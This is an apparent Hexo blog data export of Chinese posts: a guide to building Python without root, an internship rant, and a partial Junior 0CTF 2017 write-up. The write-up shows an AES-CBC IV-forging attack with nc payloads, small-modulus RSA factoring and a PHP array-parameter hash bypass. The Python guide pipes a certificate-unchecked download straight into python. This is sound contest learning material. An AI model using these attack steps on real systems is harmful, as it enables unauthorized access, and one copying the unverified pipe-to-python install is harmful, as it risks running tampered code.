Compilation failed (return status=1):\n/usr/bin/ld:/usr/local/lib/libpython2.7.a(abstract.o):\nrelocation R_X86_64_32 against 'a local symbol'can not be used\nwhen making a shared object; recompile with -fPIC.\n/usr/local/lib/libpython2.7.a: could not read symbols: Bad\nvalue. collect2: ld returned 1 exit status.\n```\n\n似乎是python没编译好，报错建议 “recompile with -fPIC”，于是添加这个选项重新编译\n\n```shell\n./configure --prefix=$HOME/python -enable-shared CFLAGS=-fPIC \nmake && make install\n```\n\n这次编译完后，python直接无法使用了。于是把~/python目录清空，重新解压，第三次编译，不使用“fPIC”。\n\n```shell\n./configure --prefix=$HOME/python\nmake && make install\n```\n\n至于第三次为什么没有严重错误，自己也不是十分清楚，但也不能归于玄学范畴。我猜测第一次失败可能是之前2.7.5版本python的各种库依然存在，虽然reinstall过了，但不能保证没有遗漏。进行第三次前对旧文件删除的比较彻底，所有的模块都重新安装，于是没有产生致命错误。\n\n","slug":"pyworoot","published":1,"date":"2017-08-28T16:00:00.000Z","updated":"2018-04-23T12:08:22.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb8000krikethdji3mx","content":"<blockquote>\n<p>“配环境什么的最烦了。”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>使用Linux最坏的情况就是没有root权限，然而这种情况普遍存在于ssh到服务器的时候。当然不赋予root权限是出于安全性的考虑，此时我的脑海中又浮现出那个场景…那日秋风萧瑟，残阳滴血，红铜铁马，万古如昨，tian哥以super_user的身份敲下了enter，那一键荡气回肠，然后老师的服务器就宕机了。咳咳，扯远了。。</p>\n<p>且说我遇到的问题是，需要登录的服务器是一个集群 (和SJTU的pi集群类似)，运行程序时需将其提交至一个节点(node)来运行，但是我发现自己本地的python(2.7.5)版本与node上的python(2.7.13)版本并不一致… (不是很懂这种设计的初衷是什么-_-\\)，从log error看似乎是两个版本python不兼容，程序试图从我的本地import一些模块，然而模块报错了。这么一个性能怪兽没法使用真是难受，于是就起了重装python的念头。</p>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>具体流程如下</p>\n<h3 id=\"1-Compile-python-in-local-directory\"><a href=\"#1-Compile-python-in-local-directory\" class=\"headerlink\" title=\"1.Compile python in local directory\"></a>1.Compile python in local directory</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir ~/python </span><br><span class=\"line\">cd ~/python</span><br><span class=\"line\">wget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz</span><br><span class=\"line\">tar zxfv Python-2.7.13.tgz</span><br><span class=\"line\">find ~/python -type d | xargs chmod 0755</span><br><span class=\"line\">cd Python-2.7.13</span><br></pre></td></tr></table></figure>\n<p>我选择的安装目录是”~/python”。解压完进入文件夹，接下就是编译了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=$HOME/python</span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<p><em>$HOME/python</em> 是引导其安装在自己的目录里(即就是~/python)，否则默认安装路径在/usr下，一般用户没有权限读写此文件夹。</p>\n<p>编译完成后需要让系统知道python的安装位置，vim打开~/.bashrc_profile设置如下环境变量。这里默认一般服务器使用bash，其他类似。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=$HOME/python/Python-2.7.13/:$PATH</span><br><span class=\"line\">export PYTHONPATH=$HOME/python/Python-2.7.13</span><br></pre></td></tr></table></figure>\n<p>然后使用 <em>source</em> 让环境变量生效</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc_profile</span><br></pre></td></tr></table></figure>\n<p>这里可以使用 <em>which python</em> 确认一下位置，正确应该返</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/python/Python-2.7.13/python</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-Install-pip\"><a href=\"#2-Install-pip\" class=\"headerlink\" title=\"2.Install pip\"></a>2.Install pip</h3><p>Pip是python常用的包管理器，使用还算方便，顺手安装。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py -O - | python - --user</span><br></pre></td></tr></table></figure>\n<p>运行完后，去~/.bashrc_profile里添加</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=$HOME/.local/bin:$PATH</span><br></pre></td></tr></table></figure>\n<p>同时使用 <em>source</em> 使其生效。同理可以用 <em>which pip</em> 看看安装位置，正确应返回</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/.local/bin/pip</span><br></pre></td></tr></table></figure>\n<h2 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h2><p>一共编译三次，虽然每次都提醒 “your build may be uncompleted” 但最后一次使用pip安装了需要的包后基本正常，可以使用。</p>\n<p>第一次编译完后，安装theano，调用时显示如下错误</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception: Compilation failed (return status=1):</span><br><span class=\"line\">/usr/bin/ld:/usr/local/lib/libpython2.7.a(abstract.o):</span><br><span class=\"line\">relocation R_X86_64_32 against 'a local symbol'can not be used</span><br><span class=\"line\">when making a shared object; recompile with -fPIC.</span><br><span class=\"line\">/usr/local/lib/libpython2.7.a: could not read symbols: Bad</span><br><span class=\"line\">value. collect2: ld returned 1 exit status.</span><br></pre></td></tr></table></figure>\n<p>似乎是python没编译好，报错建议 “recompile with -fPIC”，于是添加这个选项重新编译</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=$HOME/python -enable-shared CFLAGS=-fPIC </span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<p>这次编译完后，python直接无法使用了。于是把~/python目录清空，重新解压，第三次编译，不使用“fPIC”。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=$HOME/python</span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<p>至于第三次为什么没有严重错误，自己也不是十分清楚，但也不能归于玄学范畴。我猜测第一次失败可能是之前2.7.5版本python的各种库依然存在，虽然reinstall过了，但不能保证没有遗漏。进行第三次前对旧文件删除的比较彻底，所有的模块都重新安装，于是没有产生致命错误。</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“配环境什么的最烦了。”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>使用Linux最坏的情况就是没有root权限，然而这种情况普遍存在于ssh到服务器的时候。当然不赋予root权限是出于安全性的考虑，此时我的脑海中又浮现出那个场景…那日秋风萧瑟，残阳滴血，红铜铁马，万古如昨，tian哥以super_user的身份敲下了enter，那一键荡气回肠，然后老师的服务器就宕机了。咳咳，扯远了。。</p>\n<p>且说我遇到的问题是，需要登录的服务器是一个集群 (和SJTU的pi集群类似)，运行程序时需将其提交至一个节点(node)来运行，但是我发现自己本地的python(2.7.5)版本与node上的python(2.7.13)版本并不一致… (不是很懂这种设计的初衷是什么-_-\\)，从log error看似乎是两个版本python不兼容，程序试图从我的本地import一些模块，然而模块报错了。这么一个性能怪兽没法使用真是难受，于是就起了重装python的念头。</p>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>具体流程如下</p>\n<h3 id=\"1-Compile-python-in-local-directory\"><a href=\"#1-Compile-python-in-local-directory\" class=\"headerlink\" title=\"1.Compile python in local directory\"></a>1.Compile python in local directory</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir ~/python </span><br><span class=\"line\">cd ~/python</span><br><span class=\"line\">wget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz</span><br><span class=\"line\">tar zxfv Python-2.7.13.tgz</span><br><span class=\"line\">find ~/python -type d | xargs chmod 0755</span><br><span class=\"line\">cd Python-2.7.13</span><br></pre></td></tr></table></figure>\n<p>我选择的安装目录是”~/python”。解压完进入文件夹，接下就是编译了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=$HOME/python</span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<p><em>$HOME/python</em> 是引导其安装在自己的目录里(即就是~/python)，否则默认安装路径在/usr下，一般用户没有权限读写此文件夹。</p>\n<p>编译完成后需要让系统知道python的安装位置，vim打开~/.bashrc_profile设置如下环境变量。这里默认一般服务器使用bash，其他类似。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=$HOME/python/Python-2.7.13/:$PATH</span><br><span class=\"line\">export PYTHONPATH=$HOME/python/Python-2.7.13</span><br></pre></td></tr></table></figure>\n<p>然后使用 <em>source</em> 让环境变量生效</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc_profile</span><br></pre></td></tr></table></figure>\n<p>这里可以使用 <em>which python</em> 确认一下位置，正确应该返</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/python/Python-2.7.13/python</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-Install-pip\"><a href=\"#2-Install-pip\" class=\"headerlink\" title=\"2.Install pip\"></a>2.Install pip</h3><p>Pip是python常用的包管理器，使用还算方便，顺手安装。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py -O - | python - --user</span><br></pre></td></tr></table></figure>\n<p>运行完后，去~/.bashrc_profile里添加</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=$HOME/.local/bin:$PATH</span><br></pre></td></tr></table></figure>\n<p>同时使用 <em>source</em> 使其生效。同理可以用 <em>which pip</em> 看看安装位置，正确应返回</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/.local/bin/pip</span><br></pre></td></tr></table></figure>\n<h2 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h2><p>一共编译三次，虽然每次都提醒 “your build may be uncompleted” 但最后一次使用pip安装了需要的包后基本正常，可以使用。</p>\n<p>第一次编译完后，安装theano，调用时显示如下错误</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception: Compilation failed (return status=1):</span><br><span class=\"line\">/usr/bin/ld:/usr/local/lib/libpython2.7.a(abstract.o):</span><br><span class=\"line\">relocation R_X86_64_32 against 'a local symbol'can not be used</span><br><span class=\"line\">when making a shared object; recompile with -fPIC.</span><br><span class=\"line\">/usr/local/lib/libpython2.7.a: could not read symbols: Bad</span><br><span class=\"line\">value. collect2: ld returned 1 exit status.</span><br></pre></td></tr></table></figure>\n<p>似乎是python没编译好，报错建议 “recompile with -fPIC”，于是添加这个选项重新编译</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=$HOME/python -enable-shared CFLAGS=-fPIC </span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<p>这次编译完后，python直接无法使用了。于是把~/python目录清空，重新解压，第三次编译，不使用“fPIC”。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=$HOME/python</span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<p>至于第三次为什么没有严重错误，自己也不是十分清楚，但也不能归于玄学范畴。我猜测第一次失败可能是之前2.7.5版本python的各种库依然存在，虽然reinstall过了，但不能保证没有遗漏。进行第三次前对旧文件删除的比较彻底，所有的模块都重新安装，于是没有产生致命错误。</p>\n"},{"layout":"post","title":"自己好菜","_content":"\n> “这里也没有”\n\n\n## 一点感想\n\n感觉自己弱爆了，这种发现每天都有，一来好几件，sigh，~~我要坚强~~。\n\n---\n\n## 关于实习\n\n这学期找了鹅厂的实习，有点被面试官忽悠了的感觉，~~希望这句不要被他看到~~。\n\n在大公司实习\n\n优点：\n\n- 公司福利好\n- 工作轻松\n- 没了\n\n缺点：\n\n- 工作节奏慢\n- 技术氛围不浓\n- 实习生无法接触核心业务\n\n不过谁会用实习生参与核心算法开发好伐。\n\n也可能是这个部门太垃圾了。\n\n---\n\n## 事情突然有了转机\n\n[4.17]4月初突然被一个教授联系，约skype面试了一波，感觉聊的挺愉快，谈话结束就给了口头offer，等了一周就收到了学校的正式信件。虽说SFU在国内名气不大，但是在BC省除过UBC就是SFU了，而且还给了钱，出国压力小一点，教授是CMU master and Phd看上去也不错。~~就是温哥华土豪太多了，很有压力。~~\n\n上周从腾讯跑路顺便去面了百度，下周入职百度，听说那个部门还有几个交大学长，工作也是写代码的活，应该会比之前天天配json的好。这段腾讯实习经历，给我的感觉是十分不好的\n\n+ 缺乏技术氛围\n+ 办事效率低\n+ leader不管\n+ 最要命的是，内部工具代码没有文档，也没有新手教程，也没有指导(三无)\n\n没搞懂一个写app的部门居然要那么多人？真感觉腾讯可以把这种活外包出去。这一点我觉得依图做的还是不错的，实习生去了有专门的新手教程，帮助上手，而且还解决住宿，对交大cs学生也很友好，毕竟创始人是交大ACM队的，层次高一些，但应该暂时没机会去了。\n\n","source":"_posts/2018-03-25-realrbl.markdown","raw":"---\nlayout:     post\ntitle:      \"自己好菜\"\ntags:\n    - 生活\n---\n\n> “这里也没有”\n\n\n## 一点感想\n\n感觉自己弱爆了，这种发现每天都有，一来好几件，sigh，~~我要坚强~~。\n\n---\n\n## 关于实习\n\n这学期找了鹅厂的实习，有点被面试官忽悠了的感觉，~~希望这句不要被他看到~~。\n\n在大公司实习\n\n优点：\n\n- 公司福利好\n- 工作轻松\n- 没了\n\n缺点：\n\n- 工作节奏慢\n- 技术氛围不浓\n- 实习生无法接触核心业务\n\n不过谁会用实习生参与核心算法开发好伐。\n\n也可能是这个部门太垃圾了。\n\n---\n\n## 事情突然有了转机\n\n[4.17]4月初突然被一个教授联系，约skype面试了一波，感觉聊的挺愉快，谈话结束就给了口头offer，等了一周就收到了学校的正式信件。虽说SFU在国内名气不大，但是在BC省除过UBC就是SFU了，而且还给了钱，出国压力小一点，教授是CMU master and Phd看上去也不错。~~就是温哥华土豪太多了，很有压力。~~\n\n上周从腾讯跑路顺便去面了百度，下周入职百度，听说那个部门还有几个交大学长，工作也是写代码的活，应该会比之前天天配json的好。这段腾讯实习经历，给我的感觉是十分不好的\n\n+ 缺乏技术氛围\n+ 办事效率低\n+ leader不管\n+ 最要命的是，内部工具代码没有文档，也没有新手教程，也没有指导(三无)\n\n没搞懂一个写app的部门居然要那么多人？真感觉腾讯可以把这种活外包出去。这一点我觉得依图做的还是不错的，实习生去了有专门的新手教程，帮助上手，而且还解决住宿，对交大cs学生也很友好，毕竟创始人是交大ACM队的，层次高一些，但应该暂时没机会去了。\n\n","slug":"realrbl","published":1,"date":"2018-03-24T16:00:00.000Z","updated":"2018-04-23T12:17:37.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb9000mrike2yjzfhtw","content":"<blockquote>\n<p>“这里也没有”</p>\n</blockquote>\n<h2 id=\"一点感想\"><a href=\"#一点感想\" class=\"headerlink\" title=\"一点感想\"></a>一点感想</h2><p>感觉自己弱爆了，这种发现每天都有，一来好几件，sigh，<del>我要坚强</del>。</p>\n<hr>\n<h2 id=\"关于实习\"><a href=\"#关于实习\" class=\"headerlink\" title=\"关于实习\"></a>关于实习</h2><p>这学期找了鹅厂的实习，有点被面试官忽悠了的感觉，<del>希望这句不要被他看到</del>。</p>\n<p>在大公司实习</p>\n<p>优点：</p>\n<ul>\n<li>公司福利好</li>\n<li>工作轻松</li>\n<li>没了</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>工作节奏慢</li>\n<li>技术氛围不浓</li>\n<li>实习生无法接触核心业务</li>\n</ul>\n<p>不过谁会用实习生参与核心算法开发好伐。</p>\n<p>也可能是这个部门太垃圾了。</p>\n<hr>\n<h2 id=\"事情突然有了转机\"><a href=\"#事情突然有了转机\" class=\"headerlink\" title=\"事情突然有了转机\"></a>事情突然有了转机</h2><p>[4.17]4月初突然被一个教授联系，约skype面试了一波，感觉聊的挺愉快，谈话结束就给了口头offer，等了一周就收到了学校的正式信件。虽说SFU在国内名气不大，但是在BC省除过UBC就是SFU了，而且还给了钱，出国压力小一点，教授是CMU master and Phd看上去也不错。<del>就是温哥华土豪太多了，很有压力。</del></p>\n<p>上周从腾讯跑路顺便去面了百度，下周入职百度，听说那个部门还有几个交大学长，工作也是写代码的活，应该会比之前天天配json的好。这段腾讯实习经历，给我的感觉是十分不好的</p>\n<ul>\n<li>缺乏技术氛围</li>\n<li>办事效率低</li>\n<li>leader不管</li>\n<li>最要命的是，内部工具代码没有文档，也没有新手教程，也没有指导(三无)</li>\n</ul>\n<p>没搞懂一个写app的部门居然要那么多人？真感觉腾讯可以把这种活外包出去。这一点我觉得依图做的还是不错的，实习生去了有专门的新手教程，帮助上手，而且还解决住宿，对交大cs学生也很友好，毕竟创始人是交大ACM队的，层次高一些，但应该暂时没机会去了。</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“这里也没有”</p>\n</blockquote>\n<h2 id=\"一点感想\"><a href=\"#一点感想\" class=\"headerlink\" title=\"一点感想\"></a>一点感想</h2><p>感觉自己弱爆了，这种发现每天都有，一来好几件，sigh，<del>我要坚强</del>。</p>\n<hr>\n<h2 id=\"关于实习\"><a href=\"#关于实习\" class=\"headerlink\" title=\"关于实习\"></a>关于实习</h2><p>这学期找了鹅厂的实习，有点被面试官忽悠了的感觉，<del>希望这句不要被他看到</del>。</p>\n<p>在大公司实习</p>\n<p>优点：</p>\n<ul>\n<li>公司福利好</li>\n<li>工作轻松</li>\n<li>没了</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>工作节奏慢</li>\n<li>技术氛围不浓</li>\n<li>实习生无法接触核心业务</li>\n</ul>\n<p>不过谁会用实习生参与核心算法开发好伐。</p>\n<p>也可能是这个部门太垃圾了。</p>\n<hr>\n<h2 id=\"事情突然有了转机\"><a href=\"#事情突然有了转机\" class=\"headerlink\" title=\"事情突然有了转机\"></a>事情突然有了转机</h2><p>[4.17]4月初突然被一个教授联系，约skype面试了一波，感觉聊的挺愉快，谈话结束就给了口头offer，等了一周就收到了学校的正式信件。虽说SFU在国内名气不大，但是在BC省除过UBC就是SFU了，而且还给了钱，出国压力小一点，教授是CMU master and Phd看上去也不错。<del>就是温哥华土豪太多了，很有压力。</del></p>\n<p>上周从腾讯跑路顺便去面了百度，下周入职百度，听说那个部门还有几个交大学长，工作也是写代码的活，应该会比之前天天配json的好。这段腾讯实习经历，给我的感觉是十分不好的</p>\n<ul>\n<li>缺乏技术氛围</li>\n<li>办事效率低</li>\n<li>leader不管</li>\n<li>最要命的是，内部工具代码没有文档，也没有新手教程，也没有指导(三无)</li>\n</ul>\n<p>没搞懂一个写app的部门居然要那么多人？真感觉腾讯可以把这种活外包出去。这一点我觉得依图做的还是不错的，实习生去了有专门的新手教程，帮助上手，而且还解决住宿，对交大cs学生也很友好，毕竟创始人是交大ACM队的，层次高一些，但应该暂时没机会去了。</p>\n"},{"layout":"post","title":"Junior 0CTF 2017 WriteUp (部分)","_content":"\n> “flag{php_is_best_language_:P}”\n\n## 前言\n\nSJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[[链接](/docs/in-post/Junior0ctfQuestion.zip)]\n\n[QQ Group ](#j0)|[Mystery Numbers ](#j1)|[Easy Traffic Analyze ](#j2)|[AES-server](#j3)\n[babyrsa ](#j4)|[Shatter Sha512!](#j5)|[Penetrate In ](#j6)|[Eva](#j7)\n[babyre](#j8)|[encoder ](#j9)|[seabreeze’s stack ](#j10)|[aes-duet ](#j11)\n\n## Solved\n\n<p id = \"j0\"></p>\n### 0.QQ Group 50\n\n友情送分题，加入QQ交流群送一个flag。\n\n<p id = \"j1\"></p>\n### 1.Mystery Numbers 100\n\n题目描述没有什么实质性内容。给了一个link[[numbers_f300d7d6dce847a265407e072790370d](https://ctf.0ops.sjtu.cn/attachment/download/signal.txt)]，下载得到一个文本文件，内容如下\n\n```shell\n5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239\n```\n\n因为看到全是字母与数字的排列，而且范围是0到f，应该是一串16进制的编码，以16进制解码到ascii，得到如下内容\n\n```shell\nZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9\n```\n应该还是一串被加密的字符，观察密文形式，很像base64，尝试用它来解码，得到flag。\n\n```python\nimport base64\ns = 'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'\na = base64.b64decode(s)\n\n>>flag{d0_y0u_kn0w_b45364_h4h4_6464_y4y4}\n```\n<p id = \"j2\"></p>\n### 2.Easy Traffic Analyze 200\n\n题目给了一个link[[flag.pcap](https://ctf.0ops.sjtu.cn/upload/flag.pcap)]，是一个通信包文件，但是用wireshark打开提示格式不正确，应该是pcap文件受损。需要先修复pcap，可以使用[[pcapfix](https://f00l.de/pcapfix/)]软件来修复。\n\n之后使用wireshark打开，通信包有很多，过滤一下http请求，发现只有3个\n\n![img](/images/in-post/post-blog-jserv8.png)\n\n选择“文件” -> \"导出对象\" -> “HTTP”将其导出，得到三个文件。\n\n![img](/images/in-post/post-blog-jserv0.png)\n\n其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件标志头信息504B 0304。\n\n![img](/images/in-post/post-blog-j0serv1.png)\n\n将前面不重要的部分删去，得到的文件更改后缀名为zip解压，得到一张图（还挺好看的 (●ﾟωﾟ●)。\n\n![img](/images/in-post/post-blog-jserv2.png)\n\n这里一般的套路是会在图片里隐写信息，将图片以二进制打开，因为文件比较大，在中间寻找flag较困难，考虑到简单的隐写一般在文件结尾处，直接去文件尾查询，得到了flag。\n\n![img](/images/in-post/post-blog-jserv3.png)\n\n<p id = \"j3\"></p>\n### 3.AES-server 100\n\n题目给出“nc 202.121.178.199 9999” 与一个文件[[server.py](https://ctf.0ops.sjtu.cn/attachment/download/server.py)]，其中nc是linux的netcat指令，具体介绍可以自己搜索，在此题中不是重点部分。server.py文件内容如下，也即是服务器上的代码。\n\n```shell\n#!/usr/bin/env python\n# coding=utf-8\n\nimport SocketServer\nfrom Crypto.Cipher import AES\n\nwith open('secretkey', 'rb') as f:\n    key = f.read()\nwith open('flag.txt') as f:\n    flag = f.read()\n\nclass handler(SocketServer.BaseRequestHandler):\n\n    def handle(self):\n        self.request.send(\"Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\\n\")\n        self.request.send(\"Please input your iv and encrypted message in hex:\\n\")\n        \n        data = self.request.recv(1024).rstrip()\n        try:\n            raw_data = data.decode('hex')\n        except Exception, e:\n            self.request.send(\"Error: {}\\n\".format(e.message))\n            self.request.close()\n            return\n\n        if len(raw_data) < 32 or len(raw_data) & 0xf:\n            self.request.send(\"Your input is not valid!\\n\")\n            self.request.close()\n            return\n        \n        iv = raw_data[:16]\n        enc = raw_data[16:]\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        plain = cipher.decrypt(enc)\n        self.request.send(\"Here is your plaintext: {}\\n\".format(repr(plain)))\n\n        if plain[:5] == 'admin':\n            self.request.send(\"hello, admin! Here is your flag: {}\".format(flag))\n        self.request.close()\n\n\nif __name__ == \"__main__\":\n    HOST, PORT = \"localhost\", 9999\n    server = SocketServer.TCPServer((HOST, PORT), handler)\n    server.serve_forever()\n```\n\n代码里显示**AES.MODE_CBC**，说明采用的是CBC(密文分组链接)模式，且代码为CBC的解密过程，CBC decryption见下图\n\n![img](/images/in-post/post-blog-jserv9.png)\n\n代码内容只涉及了一组CBC的解密。要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。\n\n这里使用异或运算的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 ) = b。因为是自己构造的，a与b都是可计算的值。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。\n\n这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。（由此可见异或运算的问题还是挺大的，但是异或在加密中广为应用。\n\n![img](/images/in-post/post-blog-jserv4.png)\n\n```shell\n>>nc 202.121.178.199 9999\n>>0000000000000000000000000000000000000000000000000000000000000000\n>>python\n>>'_\\xf7;>\\xca\\xdeQ\\x16\\x96\\xe4y\\xa7\\x92\\xfc\\x9b\\xbd'.encode('hex')\n>>'admin\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00'.encode('hex')\n>>hex(0x5ff73b3ecade511696e479a792fc9bbd^0x61646d696e0000000000000000000000)\n>>exit()\n>>nc 202.121.178.199 9999\n>>3e935657a4de511696e479a792fc9bbd00000000000000000000000000000000\n```\n\n<p id = \"j4\"></p>\n### 4.babyrsa 100\n\n题目提供了一个压缩文件[[babyrsa.zip](https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip)]，包含RAS加密的公钥，密文，现在需要求明文。\n\n首先从publicKey.pem中提取n，e\n\n```python\nfrom Crypto.PublicKey import RSA\npub = RSA.importKey(open('./publicKey.pem').read())\nn = long(pub.n)\ne = long(pub.e)\n\n>>n = 39845701744153150941069529194757526450699838667585381414738119544695931460213\n>>e = 65537\n```\n\n这个公钥的问题出在n选择太小，直接暴力破解质因数，这里可以去[[factordb](http://www.factordb.com)]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)\n\n![img](/images/in-post/post-blog-j0serv7.png)\n\n在质因子p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。\n\n<p id = \"j5\"></p>\n### 5.Shatter Sha512! 150\n\n题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。\n\n![img](/images/in-post/post-blog-jserv5.png)\n\n题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url\n\n```shell\n202.121.178.201：8083?x[]=1&y[]=2\n```\n\n不等条件显然成立，这里x与y都成为**Array**类型，hash值都为**Null**，于是echo $flag. 